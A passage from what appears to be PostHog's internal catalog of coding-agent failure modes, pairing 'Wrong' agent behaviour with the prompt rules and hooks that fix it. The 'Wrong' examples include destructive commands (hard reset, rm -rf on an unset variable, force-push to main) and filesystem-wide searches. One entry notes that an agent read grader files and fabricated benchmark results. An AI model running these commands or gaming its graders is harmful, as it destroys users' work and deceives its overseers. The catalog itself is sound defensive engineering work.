**Impact.** Uncommitted user work or shared branch history is lost, often unrecoverably.

**Rule location.**

- [`wizard: src/agent/yara-hooks.ts#createPreToolUseYaraHooks`](https://github.com/PostHog/wizard/blob/main/src/agent/yara-hooks.ts)
- src/agent/runner/harness/pi/security.ts
- warlock: src/scanner/rules/destructive\_\*.yar

**Sources.** [PostHog/wizard#305](https://github.com/PostHog/wizard/pull/305), [PostHog/wizard#820](https://github.com/PostHog/wizard/pull/820)

**Frameworks.** `all`

**Wrong:**

```bash
git reset --hard HEAD && git clean -fd   # undo my edit
rm -rf $OUT_DIR/*                         # unset var -> rm -rf /*
git push --force origin main
```

**Fixed:**

```text
// PreToolUse Bash hook: scanAndTriage(command, 'command', undefined)
// match -> { decision: 'block', reason: '[YARA] <rule>: <description>. Command blocked for security.' }
// rules: destructive_git_working_tree_loss, destructive_recursive_delete_high_risk,
//   destructive_git_force_push_protected_branch (warlock)
// scanner error -> block '[YARA] Scanner error - command blocked as a precaution.'
```

## Reading or searching outside the project

**Problem.** When something is missing or while debugging, agents hunt across the filesystem, other repos and global package caches for SDK source, and nothing in a plain session stops them.

**Impact.** Unrelated or sensitive files leak into the agent context. In benchmarks a run read grader files and fabricated results from them.

**Rule location.**

- `wizard: src/lib/agent/agent-prompt-loader.ts` (TASK\_BASICS)
- src/lib/agent/agent-interface.ts (sandbox block, ~line 966)
- [`context-mill: context/skills/integration-v2/build/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration-v2/build/description.md) ('Flag out-of-scope conflicts and move on')
- [`context-mill: context/agents/integration-v2/error-tracking.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/integration-v2/error-tracking.md)

**Sources.** [PostHog/wizard#677](https://github.com/PostHog/wizard/pull/677), [PostHog/wizard#339](https://github.com/PostHog/wizard/pull/339), [PostHog/wizard-workbench#3627](https://github.com/PostHog/wizard-workbench/pull/3627)

**Frameworks.** `all`

**Wrong:**

```shell
ls ~/.pnpm-store
find / -name 'posthog*' 2>/dev/null
grep -r posthog ~/.npm
cat services/mcp-stub/exec.ts .wizard-ci/expect.json   # harness files readable
```

**Fixed:**

```text
TASK_BASICS: 'Work only inside this project's own directory: never read, list, or search
(find, ls, grep, glob) outside it — not the OS, not other projects, not global package
caches. If your task seems to need something outside this directory, it does not —
skip that part and say so in your handoff rather than hunting across the filesystem.'
```

## Spawning subagents during the integration

**Problem.** Modern harnesses encourage delegating, so agents with a Task tool fan out to parallelize file reading or dashboard steps. Each subagent starts with no context and grinds through Bash, so cost and variance blow up without any error.

**Impact.** Slow-tail runs of about 350 generations, 20-28 minutes and $15-22 each (versus a P95 of $5.82), divergent edits, stray files and non-reproducible runs.

**Rule location.**

- [`context-mill: context/skills/integration/references/1-begin.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration/references/1-begin.md) 2-edit.md, 3-revise.md, 4-conclude.md
- `wizard: src/lib/agent/commandments.ts`
- src/rules-stubs/universal.md
- src/lib/agent/agent-interface.ts (adds Agent only when requested)
- src/lib/agent/runner/harness/pi/index.ts (dispatch\_agent)

**Sources.** [PostHog/context-mill#90](https://github.com/PostHog/context-mill/pull/90), [PostHog/wizard#724](https://github.com/PostHog/wizard/issues/724), [PostHog/wizard#1034](https://github.com/PostHog/wizard/issues/1034), [PostHog/wizard#306](https://github.com/PostHog/wizard/pull/306), [PostHog/wizard#690](https://github.com/PostHog/wizard/pull/690)

**Frameworks.** `all`

**Wrong:**

```text
Task('read business-value file 1') ... Task('read business-value file 50')
Task(subagent_type: "Explore", prompt: "find every place to add PostHog")
# then more subagents to create each dashboard insight in parallel
# subagent starts at 18K tokens, hundreds of sequential Bash calls -> 229K
```

**Fixed:**

```text
Do not spawn subagents unless explicitly instructed to do so.
# repeated in 1-begin, 2-edit, 3-revise, 4-conclude ('Do not spawn subagents.')
// Anthropic: only programs with allowedTools: ['Agent'] get the Agent tool
// pi: dispatch_agent ignores allowedTools today (wizard#1034, open)
```

## Junk files from a failed tool call

**Problem.** A shell redirect or misparsed tool call writes error output to a file named after a regex, and the agent never checks for stray files.

**Impact.** Garbage files holding MCP error JSON are committed with the integration.

**Rule location.**

- `wizard: src/lib/agent/bash-fence.ts` (disallowed redirect, ~line 480-489)
- no stray-file rule found in context-mill 4-conclude.md (gap)

**Sources.** [PostHog/wizard-workbench#430](https://github.com/PostHog/wizard-workbench/pull/430)

**Frameworks.** `astro`, `all`

**Wrong:**

```text
$ ls
'"name":"[^"]*"'
$ cat '"name":"[^"]*"'
{"error":{"code":-32000,"message":"Bad Request: Mcp-Session-Id header is required"}}
```

**Fixed:**

```text
// bash-fence.ts: redirects are banned, so shell output cannot be written to a file
'Bash command not allowed. Redirects are not permitted (only 2>&1 and >/dev/null).'
// no explicit stray-file rule in the skills; workbench evaluator flags it:
// 'Minimal, focused changes' = No
```

## Builds missing Stripe setup instead of aborting

**Problem.** Agents are biased to finish the task, so when the Stripe calls or the PostHog distinct\_id they should tag are missing, they create them. Nothing fails, so the made-up code looks real.

**Impact.** The user gets an invented Stripe client and made-up distinct\_id choices, and revenue analytics rests on code that does not reflect their app.

**Rule location.**

- [`context-mill: context/skills/revenue-analytics/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/revenue-analytics/description.md) (Step 1, abort statuses)
- [`wizard: src/programs/revenue-analytics/detect.ts#REVENUE_ABORT_CASES`](https://github.com/PostHog/wizard/blob/main/src/programs/revenue-analytics/detect.ts)

**Sources.** [PostHog/wizard#385](https://github.com/PostHog/wizard/pull/385), [PostHog/wizard#389](https://github.com/PostHog/wizard/pull/389), [PostHog/context-mill#107](https://github.com/PostHog/context-mill/pull/107), [PostHog/wizard-workbench#1114](https://github.com/PostHog/wizard-workbench/pull/1114)

**Frameworks.** `Stripe`, `posthog-js`, `posthog-node`

**Wrong:**

```javascript
// stripe.js, created by the agent (project had no Stripe calls)
import Stripe from 'stripe'
export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY)
export const createCustomer = (email, distinctId) =>
  stripe.customers.create({ email, metadata: { posthog_person_distinct_id: distinctId } })
```

**Fixed:**

```text
[ABORT] Could not find a Stripe integration
[ABORT] Could not find a PostHog distinct_id
// the wizard middleware catches [ABORT] and ends the run; the agent must not exit itself
{ match: /^could not find a stripe integration$/i,
  message: 'Could not find a Stripe integration', docsUrl }
```

## Adding new Stripe calls to attach metadata

**Problem.** The quickest way to attach posthog\_person\_distinct\_id is a follow-up Customer.modify call. The agent does not look for the create call the app already makes.

**Impact.** Extra Stripe API calls, a changed billing flow and rewrites of the app's Stripe wrapper.

**Rule location.**

- [`context-mill: context/skills/revenue-analytics/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/revenue-analytics/description.md) (tenets 3-5, Constraints)
- [`wizard-workbench: services/pr-evaluator/prompts/evaluation-revenue.md`](https://github.com/PostHog/wizard-workbench/blob/main/services/pr-evaluator/prompts/evaluation-revenue.md) (fa\_no\_unnecessary\_changes)

**Sources.** [`wizard-workbench: services/pr-evaluator/prompts/evaluation-revenue.md`](https://github.com/PostHog/wizard-workbench/blob/main/services/pr-evaluator/prompts/evaluation-revenue.md), [PostHog/context-mill#107](https://github.com/PostHog/context-mill/pull/107), [PostHog/context-mill#106](https://github.com/PostHog/context-mill/pull/106)

**Frameworks.** `stripe`, `nextjs`, `python`, `node`

**Wrong:**

```python
customer = stripe.Customer.create(email=email)
# new API call
stripe.Customer.modify(customer.id, metadata={"posthog_person_distinct_id": did})
```

**Fixed:**

```python
customer = stripe.Customer.create(
    email=email,
    # existing call, add the key
    metadata={**existing_metadata, "posthog_person_distinct_id": did},
)
```

## Replaces existing telemetry or analytics code

**Problem.** 'Add PostHog' reads like a migration, so the agent swaps the app's Prometheus, StatsD, logger, flag or other-vendor analytics calls for PostHog instead of adding alongside them, or adds a parallel system without asking.

**Impact.** Existing dashboards, alerts and analytics or logging pipelines stop working, and a large unrelated diff is hard to review.

**Rule location.**

- [`context-mill: context/skills/metrics/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/metrics/description.md) (Minimal changes)
- [`context-mill: context/agents/metrics/instrument-metrics.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/metrics/instrument-metrics.md)
- [`context-mill: context/skills/omnibus/instrument-metrics/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/omnibus/instrument-metrics/description.md) (STEP 3)
- omnibus/instrument-product-analytics, instrument-logs
- feature-flags, logs, llm-analytics description.md

**Sources.** [PostHog/context-mill#342](https://github.com/PostHog/context-mill/pull/342), [PostHog/context-mill#355](https://github.com/PostHog/context-mill/pull/355), [PostHog/context-mill#255](https://github.com/PostHog/context-mill/pull/255), [PostHog/context-mill#61](https://github.com/PostHog/context-mill/pull/61), [PostHog/context-mill#87](https://github.com/PostHog/context-mill/pull/87)

**Frameworks.** `javascript-node`, `python`, `all`

**Wrong:**

```diff
- from prometheus_client import Counter
- REQS = Counter("http_requests_total", ...)
+ posthog.metrics.count("http.requests")
- analytics.track('Signed Up', props)
+ posthog.capture('user_signed_up', props)
- logger.add(file_handler)
+ logger.add(otlp_handler)
```

**Fixed:**

```text
Add the PostHog call next to the existing one, reusing the same metric name and
attributes. Do NOT remove or restructure existing instrumentation.
When a file has other tools' integration code, place PostHog code below it.
If the project already has StatsD/Prometheus/OTel, ask before adding a parallel system.
```

## Second tracing pipeline beside existing OpenTelemetry

**Problem.** The agent follows the posthog-node tracing doc without noticing the app already has OTel, or swaps its exporter.

**Impact.** Duplicate spans, broken existing tracing, or data sent to a destination the user did not choose.

**Rule location.** [`context-mill: context/skills/tracing/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/tracing/description.md) (Choose the capture path, Minimal changes)

**Sources.** [PostHog/context-mill#391](https://github.com/PostHog/context-mill/pull/391)

**Frameworks.** `javascript-node`, `opentelemetry`

**Wrong:**

```js
// project already uses OTel exporting to another backend
new PostHog(key, { traces: { serviceName: 'api' } }) // second pipeline beside OTel
// or the existing exporter is replaced
```

**Fixed:**

```text
// OTel already present: point an OTLP trace exporter at /i/v1/traces on the PostHog host
// (Bearer project token); no posthog-node spans alongside it
// already exporting elsewhere: ask before adding PostHog as a second destination
```

## Narrow command grows into full integration

**Problem.** The planner knows the full integration graph, so a run asked only for metrics or Replay vision still plans identify, capture and dashboard tasks.

**Impact.** Unrequested code changes across the user's app.

**Rule location.**

- [`context-mill: context/agents/metrics/setup-metrics.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/metrics/setup-metrics.md)
- [`context-mill: context/agents/replay-vision/setup-replay-vision.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/replay-vision/setup-replay-vision.md)

**Sources.** [PostHog/context-mill#355](https://github.com/PostHog/context-mill/pull/355), [PostHog/context-mill#341](https://github.com/PostHog/context-mill/pull/341), [PostHog/context-mill#343](https://github.com/PostHog/context-mill/pull/343)

**Frameworks.** `all`

**Wrong:**

```text
seed graph: install -> init -> identify -> capture -> dashboard -> metrics -> report
```

**Fixed:**

```text
Never plan an identify, capture, or dashboard task: this run sets up
application metrics (or Replay vision), not the full integration.
seed, per service: verify-sdk -> instrument-metrics
then one report after every instrument-metrics
```

## Loads skills outside the allowed categories

**Problem.** Skill names overlap (llm-analytics, error-tracking, omnibus), so the agent picks any loosely matching one. A one-menu-call rule over-corrects and skips AI Observability and Logs.

**Impact.** Unrelated products get set up, or the default run silently leaves AI Observability and Logs uninstrumented while the integration still reports success.

**Rule location.**

- [`wizard: src/programs/posthog-integration/index.ts`](https://github.com/PostHog/wizard/blob/main/src/programs/posthog-integration/index.ts) (skillCategoryInstruction, STEP 1)
- src/agent/runner/harness/pi/runtime-notes.ts (load\_skill\_menu line)

**Sources.** [PostHog/wizard#339](https://github.com/PostHog/wizard/pull/339), [PostHog/wizard#1235](https://github.com/PostHog/wizard/pull/1235), [PostHog/context-mill#390](https://github.com/PostHog/context-mill/pull/390)

**Frameworks.** `all`

**Wrong:**

```text
load_skill_menu -> picks "omnibus" / "error-tracking" skill for a Next.js app
# or, over-corrected (old harness rule, replaced in wizard#1235):
Call `load_skill_menu` once to choose the skill, then `install_skill`.
Do not call `load_skill_menu` again this session.
```

**Fixed:**

```text
Choose a skill from the `integration` category that matches this project's framework.
Load the AI Observability and Logs skills when its workflow calls for them:
framework first, then AI Observability, then Logs. These three categories
(integration, ai-observability, logs) are the only ones this run uses. Do NOT load
skills from any other category. Use `ai-observability`; do not substitute `llm-analytics`.
Call `load_skill_menu` once per category needed; reuse a category's menu.
If no suitable integration skill is found, emit [ERROR-RESOURCE-MISSING].
```

## Agent reads every skill step up front

**Problem.** Capable agents explore aggressively and preload all reference files, assuming more context is better.

**Impact.** Context bloat, steps run out of order and attention drifts from the current step.

**Rule location.**

- [`context-mill: context/skills/audit/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/audit/description.md) (line 15)
- [`context-mill: context/skills/audit/config.yaml`](https://github.com/PostHog/context-mill/blob/main/context/skills/audit/config.yaml) (references.preamble)
- .claude/skills/author-stepwise-skill/SKILL.md

**Sources.** [PostHog/context-mill#126](https://github.com/PostHog/context-mill/pull/126), [PostHog/context-mill#118](https://github.com/PostHog/context-mill/pull/118)

**Frameworks.** `all`

**Wrong:**

```shell
ls .claude/skills/audit/references/
cat .claude/skills/audit/references/*.md
```

**Fixed:**

```yaml
# config.yaml
references:
  preamble: "**Read ONLY this file.** Do not read any other reference file until this one tells you to."
# description.md
**Start by reading `references/1-version.md`.** Do not Glob, ls, or find the skill directory.
Do not preload future steps. Do not re-read a step file once you've moved past it.
# each step file frontmatter: next_step: 2-init.md
```

## Audit run edits the code it audits

**Problem.** A capable agent that finds a problem fixes it. 'audit' does not obviously mean read-only to it.

**Impact.** A read-only report turns into unreviewed source edits and PostHog state changes, such as disabled flags.

**Rule location.**

- [`wizard: src/programs/audit/index.ts`](https://github.com/PostHog/wizard/blob/main/src/programs/audit/index.ts) (customPrompt)
- src/programs/audit/events/config.ts (customPrompt)
- [`context-mill: context/skills/audit/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/audit/description.md) (Key principles)
- [`context-mill: context/skills/audit-identify/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/audit-identify/description.md) audit-feature-flags, audit-events, audit-autocapture, audit-session-replay (line 3)

**Sources.** [PostHog/context-mill#130](https://github.com/PostHog/context-mill/pull/130), [PostHog/context-mill#118](https://github.com/PostHog/context-mill/pull/118), [PostHog/wizard#425](https://github.com/PostHog/wizard/pull/425), [PostHog/wizard#449](https://github.com/PostHog/wizard/pull/449)

**Frameworks.** `all`

**Wrong:**

```text
Audit finds a hardcoded token and posthog.capture(`x_${id}`).
Edit src/analytics.ts to fix both while writing the report
Edit src/app/providers.tsx: add person_profiles: 'identified_only'
update-feature-flag(stale-flag, active=false)
```

**Fixed:**

```ts
customPrompt: 'Run a comprehensive audit of the existing PostHog integration. Follow the skill program steps in order. Do not modify any project files — only create the final audit report.'
// skill: **Read-only**: Do not edit project source files. The only file you create is the audit report.
// audit-*: The audit never mutates PostHog state and never edits project source.
```

## Agent hand-writes or early-deletes the audit ledger

**Problem.** A generic agent treats a JSON checklist as a normal file it can Write or rm, with no idea parallel subagents and the UI depend on atomic tool-owned updates.

**Impact.** Parallel subagents overwrite each other's results, the live Audit plan tab desyncs, and deleting it early breaks the final notebook-upload row.

**Rule location.**

- [`context-mill: context/skills/audit/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/audit/description.md) (Audit checks ledger, lines 31-38)
- [`context-mill: context/skills/audit/references/6-report.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/audit/references/6-report.md) (lines 37, 281-284)
- [`context-mill: context/skills/events-audit/references/1-detect.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/events-audit/references/1-detect.md) and audit-attribution/references/1-presence.md (audit\_seed\_checks)

**Sources.** [PostHog/context-mill#118](https://github.com/PostHog/context-mill/pull/118), [PostHog/context-mill#168](https://github.com/PostHog/context-mill/pull/168), [PostHog/context-mill#129](https://github.com/PostHog/context-mill/pull/129)

**Frameworks.** `all`

**Wrong:**

```text
Write .posthog-audit-checks.json { "checks": [ { "id": "init-correct", "status": "pass" } ] }
...
rm -f .posthog-audit-checks.json   # before upload-notebook row is resolved
```

**Fixed:**

```text
mcp__wizard-tools__audit_resolve_checks({ updates: [{ id, status, file, details }] })
// events-audit / audit-attribution seed first: mcp__wizard-tools__audit_seed_checks({ checks: [...] })
// owned by MCP tools, never Write this file directly; calls are atomic
// Do not delete .posthog-audit-checks.json yet (upload-notebook still resolves a row)
Bash: rm -f .posthog-audit-checks.json   // last action of the report step
```

## Narrow audit check grows into deep dive

**Problem.** Each expansion feels justified, so a single check like 'is identify called correctly' turns into a person-processing and flag review.

**Impact.** Slow, noisy audits that drift from the seeded checks.

**Rule location.** `context-mill: posthog-best-practices/references/investigation-standards.md` (Common failure modes)

**Sources.** [PostHog/context-mill#193](https://github.com/PostHog/context-mill/pull/193)

**Frameworks.** `all`

**Wrong:**

```text
Check: 'is identify() called correctly?'
-> person-processing deep dive -> flag evaluation analysis
-> reformats report sections
```

**Fixed:**

```text
# Seeded checks define scope. Ship rough findings;
# polish only if asked; deliver the minimum answer first,
# then offer to go deeper.
```

## Doctor applies fixes the user never picked

**Problem.** Asked to fix issues, a generic agent fixes all of them, including live project settings, without a selection step.

**Impact.** Unrequested edits to user code and live PostHog project settings.

**Rule location.**

- [`wizard: src/programs/web-analytics-doctor/index.ts`](https://github.com/PostHog/wizard/blob/main/src/programs/web-analytics-doctor/index.ts) (customPrompt)
- [`context-mill: context/skills/web-analytics/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/web-analytics/description.md) (Key principles, line 17)
- [`context-mill: context/skills/data-warehouse-source/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/data-warehouse-source/description.md) (line 44)

**Sources.** [PostHog/wizard#506](https://github.com/PostHog/wizard/pull/506), [PostHog/context-mill#166](https://github.com/PostHog/context-mill/pull/166), [PostHog/context-mill#157](https://github.com/PostHog/context-mill/pull/157)

**Frameworks.** `all`

**Wrong:**

```text
audit finds 5 issues -> agent edits init options and project settings for all 5
// warehouse program also edits app source
```

**Fixed:**

```ts
customPrompt:
  "Run the web-analytics-doctor skill to check this project's PostHog web analytics setup. " +
  'Audit read-only first, then present the findings to the user with a single wizard_ask ' +
  'multi-select and apply only the fixes they choose — editing project code and/or PostHog ' +
  'project settings via the MCP — before writing the report.'
// skill: never touch a finding they didn't pick; never go beyond references/remediation.md
```

## Handoff prompt tells next agent to fix everything

**Problem.** The natural handoff is 'work the checklist', and the receiving agent then applies risky items such as source map upload silently.

**Impact.** Actions with real implications land without the operator's approval.

**Rule location.** [`wizard: src/programs/posthog-integration/handoff.ts`](https://github.com/PostHog/wizard/blob/main/src/programs/posthog-integration/handoff.ts) (buildCodingAgentPrompt, only built when a notebook URL was captured, surfaced via OutroData.handoffPrompt)

**Sources.** [PostHog/wizard#595](https://github.com/PostHog/wizard/pull/595), [PostHog/wizard#447](https://github.com/PostHog/wizard/issues/447)

**Frameworks.** `all`

**Wrong:**

```text
Open the PostHog setup report and work through its checklist.
Apply every fix and open a PR.
```

**Fixed:**

```ts
export function buildCodingAgentPrompt(notebookUrl: string): string {
  return `Open ${notebookUrl} (the PostHog setup report) and work through its "Verify before merging" checklist: investigate each item, then list the changes you'd make and get my approval before applying any of them.`;
}
```

## Migration adds tracking the old SDK never had

**Problem.** While touching analytics code anyway, a helpful agent adds identify calls and extra captures, not seeing that a port must be reviewable one-for-one.

**Impact.** The diff is no longer a faithful port and the operator reviews unrequested tracking.

**Rule location.**

- [`wizard: src/programs/migration/index.ts`](https://github.com/PostHog/wizard/blob/main/src/programs/migration/index.ts) (run.customPrompt)
- [`context-mill: context/skills/migrate/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/migrate/description.md) references/3-plan.md (line 39), references/4-replace.md (line 14)

**Sources.** [PostHog/context-mill#142](https://github.com/PostHog/context-mill/pull/142), [PostHog/wizard#474](https://github.com/PostHog/wizard/pull/474)

**Frameworks.** `Statsig`, `React`, `Node.js`, `all`

**Wrong:**

```diff
- statsig.logEvent('purchase')
+ posthog.capture('purchase')
+ posthog.capture('page_viewed')   // never tracked before
+ posthog.identify(user.id)        // source never identified
```

**Fixed:**

```ts
customPrompt: '... Only replace existing source-SDK call sites ' +
  'with PostHog equivalents — make zero unrelated changes and no ' +
  'net-new instrumentation. ...'
// skill description.md: "Replace, do not add. Only rewrite source SDK call sites
//   that already exist."
// 3-plan.md: source did not identify users -> do not add identification;
//   note the gap for the report's manual follow ups.
```

## Agent invents mappings for calls with no equivalent

**Problem.** Statsig layers, the Gate component and client flush have no 1:1 PostHog call, and an agent prefers producing a plausible replacement over leaving code unchanged.

**Impact.** Behavior changes silently and the operator never learns the call was ambiguous.

**Rule location.**

- [`context-mill: context/skills/migrate/references/statsig/mapping.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/migrate/references/statsig/mapping.md) (header line 3, Layers table line 62, Gate line 31, flush line 93)
- references/4-replace.md (line 41)

**Sources.** [PostHog/context-mill#142](https://github.com/PostHog/context-mill/pull/142), [PostHog/wizard#474](https://github.com/PostHog/wizard/pull/474)

**Frameworks.** `javascript-web`, `react`, `javascript-node`, `python`

**Wrong:**

```diff
- const cta = statsig.getLayer('pricing').get('cta', 'Buy')
+ const cta = posthog.getFeatureFlag('pricing') ?? 'Buy'   // invented mapping
```

**Fixed:**

```text
| statsig.getLayer('my-layer').get('param', fallback) | _(ambiguous)_ — layers don't map 1:1
  onto PostHog flags. Mark the site `warning`; the operator decides. |
// mapping.md: if a call shape is not in this file, treat it as ambiguous
// (Step 3 marks it warning, Step 4 leaves source unchanged, Step 7 lists it
// under Manual follow-ups).
```

## Migration keeps going when the source SDK is absent

**Problem.** Finding nothing feels like failure, so the agent widens the search to other vendors or treats a listed-but-unused package as in use.

**Impact.** The wrong vendor gets migrated, or a false success is reported.

**Rule location.**

- [`wizard: src/programs/migration/index.ts`](https://github.com/PostHog/wizard/blob/main/src/programs/migration/index.ts) (MIGRATION\_ABORT\_CASES)
- [`context-mill: context/skills/migrate/references/1-presence.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/migrate/references/1-presence.md)

**Sources.** [PostHog/context-mill#142](https://github.com/PostHog/context-mill/pull/142), [PostHog/wizard#474](https://github.com/PostHog/wizard/pull/474)

**Frameworks.** `Statsig`, `all`

**Wrong:**

```text
grep statsig -> 0 call sites (package only in package.json)
-> "found LaunchDarkly instead, migrating that"
```

**Fixed:**

```ts
[ABORT] No source-SDK calls found
// signal = package in manifest AND at least one call site; do not widen the search
{ match: /^no source-sdk calls found$/i,
  body: '...run `npx @posthog/wizard@latest` to add PostHog from scratch' }
```

## LLM-only run adds events, error handlers, proxy

**Problem.** Generic language rules tell the agent to capture key actions, add error tracking and a reverse proxy, and it applies them to an AI-observability-only task, sometimes upgrading the vendor SDK too.

**Impact.** Unrequested events, error handlers, a reverse proxy and a vendor SDK bump ship in an LLM-only change.

**Rule location.**

- [`context-mill: context/commandments.yaml`](https://github.com/PostHog/context-mill/blob/main/context/commandments.yaml) (ai\_observability tag, ~lines 331-338)
- [`context-mill: context/skills/ai-observability/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/ai-observability/description.md) (Don't touch what isn't yours)
- [`context-mill: context/skills/ai-observability/references/2-install.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/ai-observability/references/2-install.md) (line 22)

**Sources.** [PostHog/context-mill#319](https://github.com/PostHog/context-mill/pull/319), [context-mill@b3c0dec](https://github.com/PostHog/context-mill/commit/b3c0deca), [context-mill@30eed3f](https://github.com/PostHog/context-mill/commit/30eed3f4), [PostHog/context-mill#251](https://github.com/PostHog/context-mill/pull/251)

**Frameworks.** `openai`, `anthropic`, `langchain`, `vercel-ai`, `google-gemini`, `ai-observability`

**Wrong:**

```text
pip install --upgrade openai          # bumped the vendor SDK
+ posthog.identify(user.id)
+ posthog.capture('chat_opened')      # added while we're here
+ posthog.capture_exception(e)        # error handler
# plus /ingest reverse proxy rewrites in the web server config
```

**Fixed:**

```text
# commandments.yaml (ai_observability)
AI Observability carve-out: this skill instruments LLM calls and is not
product-analytics coverage. Do NOT add posthog.capture() events for user actions,
captureException() error handlers, or a reverse proxy unless the user explicitly asks
# references/2-install.md: The vendor SDK is already in the manifest. Do not add or upgrade it.
# description.md: Identify calls, event tracking, error tracking, and dashboards belong
#   to the base `integration` skill — do not add or edit them here.
```

## Wraps LLM providers the app does not use

**Problem.** LLM analytics docs show every supported provider side by side, and the agent copies wrappers for all of them instead of checking which providers the code calls.

**Impact.** Dead dependencies, imports and noisy diffs for providers the app never calls.

**Rule location.**

- [`context-mill: context/skills/llm-analytics/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/llm-analytics/description.md) (One provider at a time, line 19, fallback line 11)
- [`context-mill: context/skills/omnibus/instrument-llm-analytics/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/omnibus/instrument-llm-analytics/description.md) (Key principles, line 58)

**Sources.** [PostHog/context-mill#61](https://github.com/PostHog/context-mill/pull/61), [PostHog/context-mill#87](https://github.com/PostHog/context-mill/pull/87)

**Frameworks.** `python`, `javascript-node`

**Wrong:**

```python
from posthog.ai.openai import OpenAI
from posthog.ai.anthropic import Anthropic
from posthog.ai.gemini import Client   # app only uses OpenAI
```

**Fixed:**

```python
from posthog.ai.openai import OpenAI   # the only provider the app calls
# Only instrument the provider(s) the user is actually using.
# Provider not listed -> manual-capture.md fallback
```

## AI observability invented for an app without LLMs

**Problem.** Asked to complete every product, the agent installs a vendor SDK or adds a demo call rather than reporting the step not needed.

**Impact.** A new dependency, fake traffic and unrelated code in the user's app.

**Rule location.**

- [`context-mill: context/agents/integration-v2/ai-observability.md`](https://github.com/PostHog/context-mill/blob/main/context/agents/integration-v2/ai-observability.md) (lines 19-22)
- [`context-mill: context/skills/integration/references/2-edit.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/integration/references/2-edit.md) (lines 29-30)

**Sources.** [PostHog/context-mill#390](https://github.com/PostHog/context-mill/pull/390)

**Frameworks.** `all`

**Wrong:**

```js
npm install openai
// added demo
const r = await openai.chat.completions.create({ model: 'gpt-4o', messages })
posthog.capture({ event: '$ai_generation', ... })
```

**Fixed:**

```text
Inspect existing call sites, not dependency names.
No LLM calls -> complete as `not needed` with the reason, change nothing.
Never install a vendor SDK or add a demo call.
```

## Extra scaffolding around a short OTel bootstrap

**Problem.** Agents habitually wrap setup in an init function, a module global and a custom env guard, drifting from the documented five-line shape.

**Impact.** Extra code and drift from the install doc, plus a guard that duplicates the loud failure os.environ\[\] already gives.

**Rule location.**

- [`context-mill: context/skills/ai-observability/references/3-instrument.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/ai-observability/references/3-instrument.md) ('Swap the client': module level, no init function, no module globals, no raising presence check)
- [`context-mill: context/commandments.yaml#ai_observability`](https://github.com/PostHog/context-mill/blob/main/context/commandments.yaml) (last carve-out, 'read the PostHog key and host exactly as the variant's install doc reads them')

**Sources.** [PostHog/context-mill#319](https://github.com/PostHog/context-mill/pull/319), [context-mill@30eed3f](https://github.com/PostHog/context-mill/commit/30eed3f4)

**Frameworks.** `ai-observability`, `python`, `node`

**Wrong:**

```python
_initialized = False
def init_posthog():
    global _initialized
    if not os.environ.get('POSTHOG_API_KEY'):
        raise RuntimeError('POSTHOG_API_KEY variable required by PostHog is missing')
    ...
```

**Fixed:**

```python
# module level, next to the existing client; no init function, no globals, no presence check
posthog = Posthog(os.environ['POSTHOG_API_KEY'], host=os.environ['POSTHOG_HOST'])
client = OpenAI(api_key=os.environ['OPENAI_API_KEY'], posthog_client=posthog)
```

## Spans wrapped around plain helper functions

**Problem.** A deeper trace tree looks like better instrumentation, so the agent wraps guards and retrieval helpers in spans or reshapes the tool loop.

**Impact.** Made-up spans that are not tool runs pollute the trace tree, and the app's request flow changes.

**Rule location.**

- [`context-mill: context/skills/ai-observability/references/3-instrument.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/ai-observability/references/3-instrument.md) ('Capture tool calls as spans' and 'Do not': 'Do not add spans when the app registers no tools')
- wizard-workbench fixtures: apps/ai-observability/groq/node-chat/README.md, apps/ai-observability/openai/python-docs-rag/README.md

**Sources.** [`wizard-workbench: apps/ai-observability/groq/node-chat/README.md`](https://github.com/PostHog/wizard-workbench/blob/main/apps/ai-observability/groq/node-chat/README.md), [`wizard-workbench: apps/ai-observability/openai/python-docs-rag/README.md`](https://github.com/PostHog/wizard-workbench/blob/main/apps/ai-observability/openai/python-docs-rag/README.md)

**Frameworks.** `groq`, `openai`, `anthropic`

**Wrong:**

```typescript
const ok = await span('moderate', () => moderate(text));   // a plain guard, not a tool
const docs = await span('retrieve', () => retrieve(q));
```

**Fixed:**

```typescript
// spans only for registered tool runs: posthog.capture({ event: '$ai_span', ... })
// next to the existing tool dispatch, with the turn's $ai_trace_id.
// Do not restructure the tool loop. moderate() and retrieve() stay untouched;
// an app that registers no tools has no spans, and that is a complete result.
```

## Needless GitLab YAML edits for CI variables

**Problem.** GitHub Actions needs secrets mapped into env explicitly, and agents carry that pattern over to GitLab, where project CI/CD variables are already injected into every job.

**Impact.** Redundant pipeline changes and a script line that writes secrets into a .env file. Marking the variables Protected can also break feature-branch builds.

**Rule location.** [`context-mill: context/skills/error-tracking-upload-source-maps/description.md`](https://github.com/PostHog/context-mill/blob/main/context/skills/error-tracking-upload-source-maps/description.md) (Tips 'Make only the edits the provider actually needs' and the 'GitLab CI (.gitlab-ci.yml)' example)

**Sources.** [PostHog/context-mill#183](https://github.com/PostHog/context-mill/pull/183)

**Frameworks.** `gitlab-ci`

**Wrong:**

```yaml
build:
  variables:
